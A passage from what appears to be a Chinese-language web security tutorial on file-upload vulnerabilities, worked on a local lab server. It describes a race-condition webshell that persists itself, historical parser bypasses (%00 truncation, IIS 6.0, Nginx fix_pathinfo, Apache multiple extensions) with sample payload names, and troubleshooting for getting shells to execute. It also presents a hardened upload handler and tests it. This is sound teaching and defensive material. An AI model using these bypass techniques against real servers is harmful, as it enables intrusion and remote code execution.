ls: cannot access 'uploads/shell.php': No such file or directory
uid=1000(hua) gid=1000(hua) groups=1000(hua),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),1001(docker)
```

> [!note] 弹体为什么要落地持久 shell
> 窗口随时关闭，命中是低概率事件，==命中一次就该把执行能力固化下来==：race_shell.php 在执行命令的同时写下 pwned.php，之后的交互不再依赖下一次竞态。[[W06-文件包含#6.2 PHP_SESSION_UPLOAD_PROGRESS：竞态写 session|W06 6.2]] 的上传进度竞态窗口成因不同（进度数据写进 session 后被自动清理），"并发抢窗口 + 命中即固化"的打法同构。

> [!warning] 单 worker 的 php -S 打不了竞态
> php -S 默认单进程，上传请求会占住唯一的 worker，访问请求全部排队到上传结束才被处理，窗口早已关闭。`PHP_CLI_SERVER_WORKERS=8` 从本章起靶就是这个原因（[[W06-文件包含#6.2 PHP_SESSION_UPLOAD_PROGRESS：竞态写 session|W06 6.2]] 同款处理）。真实服务器天然多进程/多线程，这条坑只存在于教学靶。

这条漏洞的根源是"先保存再检查"的顺序本身。把顺序反过来——先校验，通过才落盘——磁盘上根本不会出现待删除的不合格文件，窗口不复存在。第 10 节的防御靶按这个顺序写。

## 9. 历史解析漏洞与截断

前面各节的绕过都在当代配置上成立或失效；另有一批解析漏洞只存在于没有修复的旧环境，读老题解时会大量遇到，收录备查。

> [!info]- 历史解析漏洞与截断：先对版本，再照搬
>
> - **`%00` 截断（PHP < 5.3.4）**。C 字符串以 `\0` 结尾，旧版 PHP 的文件函数按 C 字符串处理路径：URL 里的 `%00` 解码出的空字节把路径从这里截断——上传名写 `shell.php%00.png`，后缀校验看到 `.png` 放行，`move_uploaded_file` 实际落盘 `shell.php`。PHP 5.3.4 起路径处理改为二进制安全，带空字节的路径直接失败；当代 PHP 上试 `%00` 只会得到一次失败或一个名字怪异的静态文件。
> - **IIS 6.0 的两个解析特性**（asp/asa 场景为主）。分号截断：`x.asp;.jpg` 按 `.asp` 执行——IIS 6.0 取扩展名时在分号处截断；目录解析：`x.asp/` 目录下的任意文件（如 `x.asp/1.jpg`）都按 asp 执行。PHP over IIS 的场景少见，见到 IIS 6.0 指纹再想这两条。
> - **Nginx 畸形解析（php-fpm 的 `cgi.fix_pathinfo=1`，历史默认开）**。请求 `/uploads/img.jpg/x.php`：`x.php` 不存在，但 Nginx 的 `location ~ \.php$` 只看结尾就把请求转给 fpm；fpm 找不到 `x.php` 时按 PATH_INFO 逻辑回退到存在的 `img.jpg`，把图片当 PHP 执行。配合第 7 节的图片马就是完整的 getshell 链，且不需要包含点。修复：`cgi.fix_pathinfo=0`，或 Nginx 侧 `try_files $uri =404`。判断靶有没有这条：拿一张已知图片，请求 `图片路径/x.php` 看返回。
> - **Apache 多后缀**。老式 `AddHandler application/x-httpd-php .php` 配置下，mod_mime 从右往左逐个识别扩展名，`shell.php.jpg` 会被识别出 `.php` 并交给 PHP 处理器——"只能传 .jpg，请求时当 PHP"在这类配置成立。Debian/Ubuntu 现行 mod_php 配置改用 `<FilesMatch ".+\.ph(ar|p|tml)$">` 匹配完整文件名，`shell.php.jpg` 不命中，不受影响。

## 10. 防御：让本章的绕过全部失效

防御靶 t_safe.php 按四件事组织：

1. **白名单**（归一化大小写 + 严格比较），不做黑名单；
2. **随机重命名**，后缀由白名单决定；响应只给随机名，不回显原始文件名；
3. **存储目录与 Web 根分离**（`~/labs/w07_store/`，在文档根外）；
4. **先校验后落盘**——校验不通过的请求一个字节都不落盘。

```php
<?php
// t_safe.php —— 防御靶：白名单 + 随机重命名 + 存储目录在 Web 根之外 + 不回显原始文件名
$allow = ['png', 'jpg', 'jpeg', 'gif'];
$ext = strtolower(pathinfo($_FILES['f']['name'], PATHINFO_EXTENSION));
if (!in_array($ext, $allow, true)) {
    http_response_code(400);
    exit("reject: .{$ext}\n");
}
$store = dirname(__DIR__) . '/w07_store/';          // 与 Web 根分离的独立目录
if (!is_dir($store)) {
    mkdir($store, 0755, true);
}
$dst = $store . bin2hex(random_bytes(8)) . '.' . $ext;   // 随机名，后缀由白名单决定
move_uploaded_file($_FILES['f']['tmp_name'], $dst) or exit("move failed\n");
echo "stored: " . basename($dst) . "\n";
```

把本章的代表性绕过挨个打过去：

```bash
curl -s --noproxy '*' -F 'f=@shell.php' 'http://127.0.0.1:8700/t_safe.php'
curl -s --noproxy '*' -F 'f=@shell.php;type=image/png' 'http://127.0.0.1:8700/t_safe.php'
curl -s --noproxy '*' -F 'f=@shell.php;filename=shell.php5' 'http://127.0.0.1:8700/t_safe.php'
curl -s --noproxy '*' -F 'f=@imgshell.gif' 'http://127.0.0.1:8700/t_safe.php'
```

输出：

```
reject: .php
reject: .php
reject: .php5
stored: 3e9fb911dd62bf93.gif
```

MIME 欺骗没让 `.php` 过检（类型根本不看）；等价后缀与大小写被白名单挡住；GIF89a 图片马照常存了进去，拿到的是一个随机名。看它的落点与可达性：

```bash
ls -l ~/labs/w07_store
NAME=$(ls ~/labs/w07_store | head -1)
curl -s -o /dev/null -w '%{http_code}\n' --noproxy '*' "http://127.0.0.1:8700/w07_store/$NAME"
curl -s --path-as-is -o /dev/null -w '%{http_code}\n' --noproxy '*' "http://127.0.0.1:8700/../w07_store/$NAME"
```

输出：

```
total 4
-rw-r--r-- 1 hua hua 40 Oct 23 21:48 3e9fb911dd62bf93.gif
404
404
```

文件确实存在，但文档根是 `lab/`，`w07_store/` 在它外面：正常路径与 `../` 路径都是 404，HTTP 到不了。各措施与被断掉的路线一一对应：

| 防御措施 | 断掉的路线 |
| ---- | ---- |
| 白名单（strtolower + 严格 in_array） | 黑名单的全部等价名、大小写、尾部点/空格；`.htaccess` 与 `.user.ini`（名字不在名单）；MIME 欺骗（类型根本不看） |
| 随机重命名 + 不回显原始文件名 | 三要素第二环：保存后的路径不可推知，条件竞争也定不了位 |
| 存储目录与 Web 根分离 | 三要素第三环：HTTP 请求到不了文件；Apache/Nginx 的目录级解析配置也不作用于站外目录 |
| 先校验后落盘 | 条件竞争：磁盘上不存在"已保存、待删除"的不合格文件，窗口从源头消失 |

> [!note] 存进去不等于放行
> 防御靶照样把 GIF89a 图片马存了进去（`stored: 3e9fb911dd62bf93.gif`）。防御不指望拦下一切字节——==目标是让任何存进去的文件永远凑不齐三要素==：名字进不了执行名单、路径推不出来、位置解析不到。评审一个上传功能时，按第 1 节的表逐环核对，而不是逐个 payload 试。

## 11. 常见问题

| 现象 | 原因与解决 |
| ---- | ---- |
| 服务器收不到文件，`$_FILES` 为空 | 把 `-d` 当成了 `-F`：`-d` 发的是 urlencoded 表单，没有 multipart 文件结构；文件上传一律 `-F`（[[#1. 三要素：能传上去、知道路径、能被解析\|1]] 的语法表） |
| 落盘的名字和想要的名字对不上 | `filename=` 要用分号接在 `@路径` 之后；curl 还会剪掉 `-F` 参数尾部的空白，带尾部点/空格的名字改用 requests 或 Burp 发（[[#5.2 尾部点、尾部空格与 ::$DATA\|5.2]]） |
| 上传成功但找不到文件路径 | 三处线索：响应回显、报错信息里带的路径、目录爆破（[[W03-信息泄露与前端安全\|W03]] 第 7 节）；上传目录常用名 uploads、upload、files、attachment、static |
| webshell 里 `ls` 看到的不是 Web 根 | php -S 把工作目录切到被执行脚本所在目录：先 `pwd` 定位，再按相对路径找（[[#1. 三要素：能传上去、知道路径、能被解析\|1]]） |
| 改了名的 shell 请求回来是源码 | php -S 只执行 `.php` 结尾（不区分大小写），其余按静态返回（[[#2.3 php -S 只执行 .php 后缀\|2.3]]）；真实服务器按 [[#5.3 谁会执行这些名字：三类服务器\|5.3]] 的表判 |
| 图片马传上去了、访问却只回图片内容 | 缺执行点：没有服务器把 `.gif` 当 PHP；找包含点（[[W06-文件包含\|W06]]）、`.htaccess`/`.user.ini` 场景（[[#6.2 .htaccess 与 .user.ini：让"图片"被执行\|6.2]]）或 Nginx 畸形解析（[[#9. 历史解析漏洞与截断\|9]]） |
| 包含图片马没有执行结果 | 先 `cat` 图片确认 `<?php` 完整落盘：站点做过二次渲染会抹掉代码；再查包含路径有没有被拼上 `.php` 尾缀（[[W06-文件包含\|W06]] 3.2） |
| 条件竞争一直打不中 | php -S 默认单进程、请求排队：`PHP_CLI_SERVER_WORKERS` 拉多 worker 再打；线程数继续加；目标若是"先校验后落盘"，窗口根本不存在，换思路（[[#8. 条件竞争：先保存再删除的窗口\|8]]） |
| `.htaccess`/`.user.ini` 传上了却没生效 | 三查：服务器是谁（php -S 与 Nginx 不读它们）；主配置 `AllowOverride` 是否 `All`（.htaccess）；`user_ini.cache_ttl` 缓存未过期（默认最长 300 秒）（[[#6.2 .htaccess 与 .user.ini：让"图片"被执行\|6.2]]） |
| `::$DATA` 在 Linux 靶上原样出现了 | NTFS 机制，只适用 Windows；Linux 把它当普通文件名保存（[[#5.2 尾部点、尾部空格与 ::$DATA\|5.2]]） |
| `getimagesize` 过了但代码没执行 | 内容检测只管"存进来"；执行要看解析环节——没有服务器解析 `.gif`，走包含（[[#7.3 从图片马到执行\|7.3]]）或 6.2 的路 |
| 防御靶怎么打都是 reject | 正常状态：白名单 + 随机名 + 站外存储把三要素拆干净了；先判断断在哪一环，不要硬试（[[#10. 防御：让本章的绕过全部失效\|10]]） |
